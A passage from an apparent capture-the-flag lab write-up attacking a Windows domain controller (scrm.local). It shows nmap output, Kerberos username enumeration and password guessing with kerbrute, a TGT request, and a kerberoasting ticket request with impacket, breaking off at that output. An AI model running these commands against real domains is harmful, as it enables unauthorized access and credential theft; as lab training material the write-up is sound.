</span></span><span style="display:flex;"><span>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
</span></span><span style="display:flex;"><span>|     SCRAMBLECORP_ORDERS_V1.0.3;
</span></span><span style="display:flex;"><span>|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
</span></span><span style="display:flex;"><span>|     SCRAMBLECORP_ORDERS_V1.0.3;
</span></span><span style="display:flex;"><span>|_    ERROR_UNKNOWN_COMMAND;
</span></span><span style="display:flex;"><span>5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49702/tcp open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49706/tcp open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span>59897/tcp open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style="display:flex;"><span>SF-Port4411-TCP:V<span style="color:#f92672">=</span>7.92%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>9/20%Time<span style="color:#f92672">=</span>63290F81%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NU
</span></span><span style="display:flex;"><span>SF:LL,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GenericLines,1D,<span style="color:#e6db74">&#34;SCRAMBLEC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDER
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:S_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,35,<span style="color:#e6db74">&#34;SCRAMBLEC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RPCCheck,1D,<span style="color:#e6db74">&#34;SCR
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSVersionBindReqTCP,1D,<span style="color:#e6db74">&#34;SCRAMBLECOR
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:P_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSStatusRequestTCP,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:WN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServerCookie,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLS
</span></span><span style="display:flex;"><span>SF:SessionReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Kerberos,1D,<span style="color:#e6db74">&#34;SCRAM
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:BLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SMBProgNeg,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>X11Probe,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>FourO
</span></span><span style="display:flex;"><span>SF:hFourRequest,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LPDString,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPSearchReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%
</span></span><span style="display:flex;"><span>SF:r<span style="color:#f92672">(</span>LDAPBindReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SIPOptions,35,<span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LANDesk
</span></span><span style="display:flex;"><span>SF:-RC,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServer,1D,<span style="color:#e6db74">&#34;SCRAMB
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:LECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NCP,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NotesRPC,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>JavaRMI,1D,<span style="color:#e6db74">&#34;S
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>WMSRequest,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>oracle-tns,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r
</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">(</span>ms-sql-s,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>afp,1D,<span style="color:#e6db74">&#34;SCRAMBLECOR
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:P_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>giop,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| ms-sql-info: 
</span></span><span style="display:flex;"><span>|   10.10.11.168:1433: 
</span></span><span style="display:flex;"><span>|     Version: 
</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2019</span> RTM
</span></span><span style="display:flex;"><span>|       number: 15.00.2000.00
</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2019</span>
</span></span><span style="display:flex;"><span>|       Service pack level: RTM
</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">1433</span>
</span></span><span style="display:flex;"><span>| p2p-conficker: 
</span></span><span style="display:flex;"><span>|   Checking <span style="color:#66d9ef">for</span> Conficker.C or higher...
</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>port 42300/tcp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>port 10436/tcp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>port 55122/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>port 31813/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2022-09-20T01:07:39
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3.1.1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span>|_clock-skew: mean: 9m34s, deviation: 0s, median: 9m33s
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Tue Sep 20 03:58:42 2022 -- 1 IP address (1 host up) scanned in 512.62 seconds</span></span></span></code></pre></div>
<p>I can see that the usual windows ports are open in addition to port <em>80</em> indicating the presence of a webserver and another weird port <em>4411</em> which nmap couldn&rsquo;t identify.</p>
<p>I can also see the domain name leaked by <em>ldap</em> (port 389) <em>scrm.local</em> and the domain controller name <em>DC1.scrm.local</em>, so I&rsquo;ll add these to the <em>/etc/hosts</em> file.</p>
<h3 id="webserver-enumeration">WebServer Enumeration</h3>
<p>Moving on to the webserver, the first thing I did is to enumerate subdomains while surfing the page, but I got nothing.</p>
<p>Next, I&rsquo;ll see what the site hides:</p>
<p><img src="scrm.local-home-page.png" alt="Home Page"></p>
<p><img src="scrm.local-it-service-page.png" alt="IT Services Page"></p>
<p>Looking at the <em>IT Support Page</em>, I see that NTLM authentication is disabled. This might come in handy if I get any sort of errors when trying to authenticate later.</p>
<p><img src="scrm.local-contacting-it-support-page.png" alt="Contacting IT Support Page"></p>
<p><img src="scrm.local-sales-order-app-troubleshooting-page.png" alt="Sales Order App Troubleshooting Page"></p>
<p><img src="scrm.local-password-resets-page.png" alt="Password Resets Page"></p>
<p>Moving to other pages, it looks like they are having some troubles, after a breach, and they are running some sort of custom application on port 4411 that nmap couldn&rsquo;t identify before. I also got a valid email <em>

<a href="mailto:support@scrm.local">support@scrm.local</a></em></p>
<p><img src="scrm.local-new-user-account-page.png" alt="New User Page"></p>
<p>On the <em>New User Account Page</em> there is a form but I couldn&rsquo;t get any result from it.</p>
<p>I did try directory bruteforcing but again no results.
The same goes for fuzzing the application on port <em>4411</em>.</p>
<h3 id="usernamepassword-bruteforce">Username/Password Bruteforce</h3>
<p>From here, I thought of using kerberos authentication to bruteforce usernames and maybe passwords also.</p>
<p>Usually I start enumerating usernames using 

<a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt" target="_blank"><em>seclists/Usernames/xato-net-10-million-usernames.txt</em></a> which is a long list of various usernames, to see how usernames look like; <em>for example if they use [First Name].[Last Name] or [First Initial].[Last Name] &hellip;</em>, however by looking at the previous terminal screenshot, I can see that <em>ksimpson</em> might be a valid username, so I can assume that usernames are of form <em>[First Initial][Last Name]</em></p>
<p>Now I can use 

<a href="https://github.com/ropnop/kerbrute" target="_blank"><em>kerbrute</em></a> with a specific wordlist, like the ones from 

<a href="https://github.com/attackdebris/kerberos_enum_userlists" target="_blank"><em>kerberos_enum_userlists</em></a>, specifically I&rsquo;ll use 

<a href="https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt" target="_blank"><em>A-ZSurnames.txt</em></a> since I know this is how most likely usernames will be.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/kerbrute/kerbrute_linux_amd64 userenum -d scrm.local --dc dc1.scrm.local /opt/kerberos_enum_userlists/A-ZSurnames.txt 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __             __               __     
</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 10/01/22 - Ronnie Flathers @ropnop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2022/10/01 01:52:59 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>2022/10/01 01:52:59 &gt;  	dc1.scrm.local:88
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2022/10/01 01:53:00 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	ASMITH@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:54:00 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	JHALL@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:54:08 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	KSIMPSON@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:54:12 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	KHICKS@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:55:05 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	SJENKINS@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:55:56 &gt;  Done! Tested <span style="color:#ae81ff">13000</span> usernames <span style="color:#f92672">(</span><span style="color:#ae81ff">5</span> valid<span style="color:#f92672">)</span> in 176.760 seconds</span></span></code></pre></div>
<p>After getting these few results, I thought of doing a simple password guessing attack where I&rsquo;ll try to login using the username as the password, having different case sensitivity. What I mean is the following:</p>
<ul>
<li>
<p>First I&rsquo;ll copy these results to a temporarily file called <em>tmp</em>:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat tmp 
</span></span><span style="display:flex;"><span>2022/10/01 01:53:00 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	ASMITH@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:54:00 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	JHALL@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:54:08 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	KSIMPSON@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:54:12 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	KHICKS@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:55:05 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	SJENKINS@scrm.local</span></span></code></pre></div></p>
</li>
<li>
<p>Then I&rsquo;ll generate a simple <em>username:password</em> list <em>(of usernames as passwords but having different case sensitivity)</em> because 

<a href="https://github.com/ropnop/kerbrute" target="_blank"><em>kerbrute</em></a> accepts using this format for bruteforcing:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat tmp | awk <span style="color:#e6db74">&#39;{print $7}&#39;</span> | awk -F<span style="color:#e6db74">&#39;@&#39;</span> <span style="color:#e6db74">&#39;{print $1&#34;:&#34;$1&#34;\n&#34;$1&#34;:&#34;tolower($1)&#34;\n&#34;$1&#34;:&#34;substr($1,0,1)tolower(substr($1,2))&#34;\n&#34;$1&#34;:&#34;substr($1,0,2)tolower(substr($1,3))}&#39;</span>
</span></span><span style="display:flex;"><span>ASMITH:ASMITH
</span></span><span style="display:flex;"><span>ASMITH:asmith
</span></span><span style="display:flex;"><span>ASMITH:Asmith
</span></span><span style="display:flex;"><span>ASMITH:ASmith
</span></span><span style="display:flex;"><span>JHALL:JHALL
</span></span><span style="display:flex;"><span>JHALL:jhall
</span></span><span style="display:flex;"><span>JHALL:Jhall
</span></span><span style="display:flex;"><span>JHALL:JHall
</span></span><span style="display:flex;"><span>KSIMPSON:KSIMPSON
</span></span><span style="display:flex;"><span>KSIMPSON:ksimpson
</span></span><span style="display:flex;"><span>KSIMPSON:Ksimpson
</span></span><span style="display:flex;"><span>KSIMPSON:KSimpson
</span></span><span style="display:flex;"><span>KHICKS:KHICKS
</span></span><span style="display:flex;"><span>KHICKS:khicks
</span></span><span style="display:flex;"><span>KHICKS:Khicks
</span></span><span style="display:flex;"><span>KHICKS:KHicks
</span></span><span style="display:flex;"><span>SJENKINS:SJENKINS
</span></span><span style="display:flex;"><span>SJENKINS:sjenkins
</span></span><span style="display:flex;"><span>SJENKINS:Sjenkins
</span></span><span style="display:flex;"><span>SJENKINS:SJenkins</span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat tmp | awk <span style="color:#e6db74">&#39;{print $7}&#39;</span> | awk -F<span style="color:#e6db74">&#39;@&#39;</span> <span style="color:#e6db74">&#39;{print $1&#34;:&#34;$1&#34;\n&#34;$1&#34;:&#34;tolower($1)&#34;\n&#34;$1&#34;:&#34;substr($1,0,1)tolower(substr($1,2))&#34;\n&#34;$1&#34;:&#34;substr($1,0,2)tolower(substr($1,3))}&#39;</span> &gt; users-passwords.txt</span></span></code></pre></div></p>
</li>
<li>
<p>Using this method, I will try <em>4 invalid login attemps</em> per account which will most likely not trigger any account lockout:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/kerbrute/kerbrute_linux_amd64 bruteforce --dc dc1.scrm.local -d scrm.local users-passwords.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __             __               __     
</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 10/01/22 - Ronnie Flathers @ropnop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2022/10/01 02:17:29 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>2022/10/01 02:17:29 &gt;  	dc1.scrm.local:88
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2022/10/01 02:17:30 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID LOGIN:	KSIMPSON@scrm.local:ksimpson
</span></span><span style="display:flex;"><span>2022/10/01 02:17:30 &gt;  Done! Tested <span style="color:#ae81ff">20</span> logins <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> successes<span style="color:#f92672">)</span> in 0.831 seconds</span></span></code></pre></div></p>
</li>
</ul>
<p>And I got a valid hit!! However I can&rsquo;t use these credentials directly because <em>NTLM authentication is disabled</em>, so I had to think of other solutions, like using kerberos tickets to interact with the domain.</p>
<h2 id="tgt-request">TGT Request</h2>
<p>To do that I need to request a <em>Ticket Granting Ticket</em> from the domain controller, which I will use to authenticate to other services like LDAP.
For this I will use 

<a href="https://github.com/SecureAuthCorp/impacket" target="_blank"><em>impacket-scripts</em></a>:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/getTGT.py -dc-ip dc1.scrm.local scrm/ksimpson:ksimpson
</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in ksimpson.ccache</span></span></code></pre></div></p>
<p>And to use this ticket, I need to store it in an environment variable that impacket uses by default:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/getTGT.py --help
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>-k                    Use Kerberos authentication. Grabs credentials from ccache file <span style="color:#f92672">(</span>KRB5CCNAME<span style="color:#f92672">)</span> based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ export KRB5CCNAME<span style="color:#f92672">=</span>ksimpson.ccache</span></span></code></pre></div></p>
<h2 id="kerberosting-attack">Kerberosting Attack</h2>
<p>From here, using 

<a href="https://github.com/SecureAuthCorp/impacket" target="_blank"><em>impacket-scripts</em></a>, I can query <em>LDAP</em> for different information, so I&rsquo;ll look for any <em>Service Principal Name</em> to see if 

<a href="https://youtu.be/xH5T9-m9QXw" target="_blank"><em>kerberosting attack</em></a> might work.</p>
<ul>
<li>Note: If you&rsquo;re following along using older versions of impacket (&lt;0.9.25) and you&rsquo;re getting an error like <em>&hellip; derived from BaseException &hellip;</em> then you can either clone the newer version of 

<a href="https://github.com/SecureAuthCorp/impacket" target="_blank"><em>impacket-scripts</em></a> or follow the 

<a href="https://github.com/SecureAuthCorp/impacket/issues/1206" target="_blank"><em>solution</em></a> proposed by the author of this machine. For this write-up, I will use the newer version of impacket 0.10.1 as of the time of writing this.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/GetUserSPNs.py -dc-host dc1.scrm.local scrm.local/ksimpson:ksimpson -k -no-pass -target-domain scrm.local
</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
</span></span><span style="display:flex;"><span>----------------------------  ------  --------  --------------------------  --------------------------  ----------
</span></span><span style="display:flex;"><span>MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 18:32:02.351452  2022-10-01 02:52:28.543759             
</span></span><span style="display:flex;"><span>MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 18:32:02.351452  2022-10-01 02:52:28.543759             </span></span></code></pre></div>
<ul>
<li>Notice the use of <em>dc1.scrm.local</em> using the flag <em>-dc-host</em> and not the <em>ip address</em> like <em>-dc-host 10.10.11.168</em> which will give an error.</li>
</ul>
<h3 id="requesting-ticket">Requesting Ticket</h3>
<p>It appears that I can do 

<a href="https://youtu.be/xH5T9-m9QXw" target="_blank"><em>kerberosting attack</em></a> against <em>MSSQLSvc</em>, so I&rsquo;ll append the <em>-request</em> to the previous command to get the encrypted ticket for this service.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/GetUserSPNs.py -dc-host dc1.scrm.local scrm.local/ksimpson:ksimpson -k -no-pass -target-domain scrm.local -request
</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
</span></span><span style="display:flex;"><span>----------------------------  ------  --------  --------------------------  --------------------------  ----------
</span></span><span style="display:flex;"><span>MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 18:32:02.351452  2022-10-01 02:52:28.543759             
</span></span><span style="display:flex;"><span>MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 18:32:02.351452  2022-10-01 02:52:28.543759             
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
